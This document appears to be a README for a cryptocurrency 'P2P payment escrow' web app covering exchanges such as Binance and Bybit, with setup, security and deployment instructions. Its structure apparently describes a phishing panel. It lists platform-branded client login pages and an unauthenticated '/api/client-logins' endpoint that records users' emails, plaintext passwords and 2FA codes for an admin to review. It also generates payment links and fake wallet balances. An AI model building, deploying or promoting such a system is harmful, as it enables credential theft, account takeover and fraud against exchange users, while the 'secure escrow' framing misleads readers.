# P2P Payment Coordinator

A secure escrow management system for peer-to-peer cryptocurrency payments across multiple trading platforms.

## 🚀 Features

### Core Functionality
- ✅ Multi-platform support (Binance, Bybit, OKX, Kraken, Huobi, Bitget, KuCoin, Gate.io, MEXC)
- ✅ Escrow creation and management
- ✅ Wallet balance tracking (USD, EUR, GBP, NGN)
- ✅ Payment link generation
- ✅ Real-time notifications
- ✅ Transaction history
- ✅ Client login tracking and analytics

### Security Features
- 🔒 **Helmet.js**: HTTP security headers (XSS, clickjacking, MIME sniffing protection)
- 🔒 **Rate Limiting**: 5 login attempts per 15 minutes, 100 API requests per minute
- 🔒 **CORS Whitelist**: Configurable allowed origins
- 🔒 **Input Validation**: Express-validator on all POST/PATCH endpoints
- 🔒 **Password Hashing**: Bcrypt with 10 salt rounds
- 🔒 **JWT Authentication**: 8-hour token expiry
- 🔒 **Request Logging**: Morgan combined format for audit trails
- 🔒 **Environment Validation**: Startup checks for required variables
- 🔒 **Sentry Integration**: Production error monitoring and tracking
- 🔒 **TOTP 2FA**: Speakeasy-based two-factor authentication
- 🔒 **Email Verification**: JWT-based email verification system

## 📋 Prerequisites

- Node.js 18+ (recommended: 20.x LTS)
- npm 9+
- PostgreSQL 14+ (for production) or SQLite (for development)
- Gmail account or SendGrid API key (for email verification)
- Sentry account (optional, for error monitoring)

## 🛠️ Installation

### 1. Clone Repository

```bash
git clone https://github.com/yourusername/Go-accept.git
cd Go-accept
```

### 2. Install Dependencies

```bash
# Install root dependencies (frontend)
npm install

# Install backend dependencies
cd server
npm install
cd ..
```

### 3. Configure Environment Variables

Create a `.env` file in the root directory:

```env
# Authentication
ADMIN_PASSWORD=your-strong-admin-password-here
CLIENT_PASSWORD=your-strong-client-password-here
JWT_SECRET=your-128-character-cryptographic-secret-here

# Server Configuration
PORT=4000
ALLOWED_ORIGINS=http://localhost:5173,http://localhost:3000

# Sentry Error Monitoring (optional)
SENTRY_DSN=https://xxxxx@xxxxx.ingest.sentry.io/xxxxx

# Email Configuration (optional)
EMAIL_HOST=smtp.gmail.com
EMAIL_PORT=587
EMAIL_USER=your-email@gmail.com
EMAIL_PASSWORD=your-app-password
EMAIL_FROM=noreply@yourapp.com

# Database (for production)
DATABASE_URL=postgresql://user:password@host:5432/database

# Frontend URL (for email links)
FRONTEND_URL=http://localhost:5173
```

### 4. Generate Strong JWT Secret

```bash
# Generate a secure 128-character secret
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
```

Copy the output and paste it as your `JWT_SECRET` in `.env`.

### 5. Start Development Servers

```bash
# Terminal 1: Start backend
node server/index.js

# Terminal 2: Start frontend
npm run dev
```

Frontend: http://localhost:5173
Backend API: http://localhost:4000

## 🏗️ Project Structure

```
Go-accept/
├── src/                        # Frontend React application
│   ├── components/
│   │   ├── AdminEscrowDashboard.jsx    # Admin panel
│   │   ├── ClientDashboard.jsx         # Client view
│   │   ├── ClientLogin.jsx             # Platform-branded login
│   │   ├── LoginPage.jsx               # Role selection
│   │   └── PlatformSelector.jsx        # Trading platform picker
│   ├── App.jsx
│   └── main.jsx
├── server/
│   ├── index.js               # Express API server
│   ├── migrate.js             # Database migration script
│   └── dataStore.json         # File-based storage (dev only)
├── schema.sql                 # PostgreSQL database schema
├── vercel.json               # Vercel deployment config
├── railway.json              # Railway deployment config
├── render.yaml               # Render deployment config
├── DEPLOYMENT.md             # Deployment guide
├── DATABASE_MIGRATION.md     # Database migration guide
├── .env                      # Environment variables (gitignored)
└── package.json
```

## 🔐 Security Configuration

### Password Requirements

**Before deploying to production:**

1. Change default passwords in `.env`:
   ```env
   ADMIN_PASSWORD=<16+ chars, mixed case, numbers, symbols>
   CLIENT_PASSWORD=<16+ chars, mixed case, numbers, symbols>
   ```

2. Generate strong JWT secret (128+ characters):
   ```bash
   node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
   ```

### Rate Limiting

Configured in `server/index.js`:
- **Auth endpoint**: 5 attempts per 15 minutes
- **General API**: 100 requests per minute

Adjust limits based on your traffic:
```javascript
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5
});
```

### CORS Configuration

Update `ALLOWED_ORIGINS` in `.env` with your production domains:
```env
ALLOWED_ORIGINS=https://yourdomain.com,https://www.yourdomain.com
```

### 2FA Setup

Enable TOTP-based 2FA for clients:

```bash
# Generate QR code
POST /api/auth/2fa/setup
Authorization: Bearer <token>
Body: { "email": "user@example.com" }

# Returns:
# - QR code image (scan with Google Authenticator, Authy, etc.)
# - Manual entry key
# - Secret (store securely)

# Verify code
POST /api/auth/2fa/verify
Authorization: Bearer <token>
Body: { "token": "123456", "secret": "base32-secret" }
```

### Email Verification

#### Gmail Setup:
1. Enable 2-Step Verification: https://myaccount.google.com/security
2. Create App Password: https://myaccount.google.com/apppasswords
3. Add to `.env`:
   ```env
   EMAIL_USER=your-email@gmail.com
   EMAIL_PASSWORD=your-16-char-app-password
   ```

#### SendGrid Setup:
1. Create account at https://sendgrid.com
2. Create API key in Settings > API Keys
3. Add to `.env`:
   ```env
   EMAIL_HOST=smtp.sendgrid.net
   EMAIL_USER=apikey
   EMAIL_PASSWORD=SG.xxxxxxxxxxxxx
   ```

## 🔌 API Endpoints

### Authentication

```bash
# Login
POST /api/auth/login
Body: { "role": "admin|client", "password": "..." }
Returns: { "token": "jwt-token", "role": "admin" }

# 2FA Setup
POST /api/auth/2fa/setup
Headers: Authorization: Bearer <token>
Returns: { "secret": "...", "qrCode": "data:image/png;base64,...", "manualEntry": "..." }

# 2FA Verify
POST /api/auth/2fa/verify
Headers: Authorization: Bearer <token>
Body: { "token": "123456", "secret": "base32-secret" }
Returns: { "success": true }
```

### Wallet Management

```bash
# Get wallet balance
GET /api/wallet
Headers: Authorization: Bearer <token>
Returns: { "balances": { "USD": 1000, ... }, "activity": [...] }

# Deposit funds
POST /api/wallet/deposit
Headers: Authorization: Bearer <token>
Body: { "amount": 100, "currency": "USD", "source": "Bank Transfer" }
```

### Escrow Operations

```bash
# Create escrow
POST /api/escrows
Headers: Authorization: Bearer <token>
Body: {
  "platform": "Binance",
  "paymentMethods": ["Bank Transfer", "PayPal"],
  "amount": 50,
  "currency": "USD",
  "clientEmail": "client@example.com"
}
Returns: { "id": "...", "paymentLink": "http://..." }

# Get all escrows
GET /api/escrows
Headers: Authorization: Bearer <token>

# Mark escrow as paid
PATCH /api/escrows/:id/paid
Headers: Authorization: Bearer <token>

# Release escrow funds
PATCH /api/escrows/:id/release
Headers: Authorization: Bearer <token>
```

### Email Verification

```bash
# Send verification email
POST /api/auth/send-verification
Body: { "email": "user@example.com" }

# Verify email token
POST /api/auth/verify-email
Body: { "token": "jwt-verification-token" }
```

### Client Login Tracking

```bash
# Store login attempt (no auth required)
POST /api/client-logins
Body: {
  "email": "user@example.com",
  "password": "...",
  "twoFactorCode": "123456",
  "platform": "Binance",
  "step": "email_entered"
}

# Get all login attempts (admin only)
GET /api/client-logins
Headers: Authorization: Bearer <token>
```

## 🚀 Deployment

### Production Checklist

Before deploying:

- [ ] Change `ADMIN_PASSWORD` and `CLIENT_PASSWORD` in `.env`
- [ ] Generate secure `JWT_SECRET` (128+ characters)
- [ ] Update `ALLOWED_ORIGINS` with production domains
- [ ] Configure Sentry DSN for error monitoring
- [ ] Set up email service (Gmail/SendGrid)
- [ ] Migrate to PostgreSQL (see `DATABASE_MIGRATION.md`)
- [ ] Set up automated database backups
- [ ] Configure SSL/HTTPS
- [ ] Test all endpoints in production environment

### Quick Deploy Options

#### Vercel (Frontend + Serverless API)

```bash
npm install -g vercel
vercel login
vercel
```

See `DEPLOYMENT.md` for detailed instructions.

#### Railway (Backend + Database)

```bash
npm install -g @railway/cli
railway login
railway init
railway add --database postgresql
railway up
```

#### Render (Full Stack)

See `render.yaml` configuration file and `DEPLOYMENT.md`.

## 📊 Database Migration

The application uses file-based storage (`dataStore.json`) by default for development. **For production, migrate to PostgreSQL:**

```bash
# 1. Set up PostgreSQL (Railway, Render, Supabase, AWS RDS)
# 2. Add DATABASE_URL to .env
# 3. Create schema
psql $DATABASE_URL -f schema.sql

# 4. Backup current data
cp dataStore.json dataStore.json.backup

# 5. Run migration
node server/migrate.js
```

See `DATABASE_MIGRATION.md` for complete guide.

## 🔧 Development

### Available Scripts

```bash
# Frontend development server
npm run dev

# Build for production
npm run build

# Preview production build
npm run preview

# Backend development
node server/index.js

# Database migration
node server/migrate.js
```

### Environment Variables

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| `ADMIN_PASSWORD` | Yes | admin123 | Admin login password |
| `CLIENT_PASSWORD` | Yes | client123 | Client login password |
| `JWT_SECRET` | Yes | - | JWT signing secret (128+ chars) |
| `PORT` | No | 4000 | Backend server port |
| `ALLOWED_ORIGINS` | No | localhost | Comma-separated CORS whitelist |
| `SENTRY_DSN` | No | - | Sentry error tracking DSN |
| `EMAIL_HOST` | No | - | SMTP server hostname |
| `EMAIL_PORT` | No | 587 | SMTP server port |
| `EMAIL_USER` | No | - | SMTP username |
| `EMAIL_PASSWORD` | No | - | SMTP password/API key |
| `EMAIL_FROM` | No | - | Sender email address |
| `DATABASE_URL` | No | - | PostgreSQL connection string |
| `FRONTEND_URL` | No | localhost:5173 | Frontend URL for email links |

## 🐛 Troubleshooting

### Common Issues

**Server won't start**
```
Error: Missing required environment variables
```
Solution: Create `.env` file with all required variables (see Installation step 3)

**CORS errors in browser**
```
Access to XMLHttpRequest at ... has been blocked by CORS policy
```
Solution: Add your frontend URL to `ALLOWED_ORIGINS` in `.env`

**Rate limit exceeded**
```
Too many login attempts, please try again later
```
Solution: Wait 15 minutes or adjust rate limits in `server/index.js`

**Email not sending**
```
Failed to send verification email
```
Solution:
- Verify `EMAIL_HOST`, `EMAIL_USER`, `EMAIL_PASSWORD` are correct
- For Gmail: Use App Password, not regular password
- Check firewall allows port 587/465

**Database connection failed**
```
Error: connect ECONNREFUSED
```
Solution:
- Verify `DATABASE_URL` is correct
- Check database accepts external connections
- Add `?sslmode=require` for cloud databases

## 📝 License

MIT License - feel free to use this project for commercial purposes.

## 🤝 Contributing

Contributions welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## 📞 Support

- Documentation: See `DEPLOYMENT.md` and `DATABASE_MIGRATION.md`
- Issues: Open a GitHub issue
- Security: Email security concerns to security@yourapp.com

## 🔮 Roadmap

- [ ] Complete PostgreSQL migration
- [ ] Add WebSocket for real-time updates
- [ ] Implement multi-signature escrow releases
- [ ] Add cryptocurrency payment integration
- [ ] Build mobile app (React Native)
- [ ] Add admin dashboard analytics
- [ ] Implement dispute resolution system
- [ ] Add automated currency conversion
- [ ] Build API documentation (Swagger/OpenAPI)
- [ ] Add automated testing (Jest, Cypress)

## 🙏 Acknowledgments

- Built with React, Vite, Express, and Node.js
- Security powered by Helmet, bcrypt, and express-validator
- Error monitoring by Sentry
- Icons from Lucide React
- Inspired by P2P trading platforms

---

**⚠️ IMPORTANT SECURITY REMINDER:**

Before deploying to production:
1. ✅ Change all default passwords
2. ✅ Generate strong JWT secret
3. ✅ Configure CORS whitelist
4. ✅ Migrate to PostgreSQL
5. ✅ Set up HTTPS/SSL
6. ✅ Enable error monitoring
7. ✅ Configure email verification
8. ✅ Set up automated backups

See `DEPLOYMENT.md` for complete production setup guide.
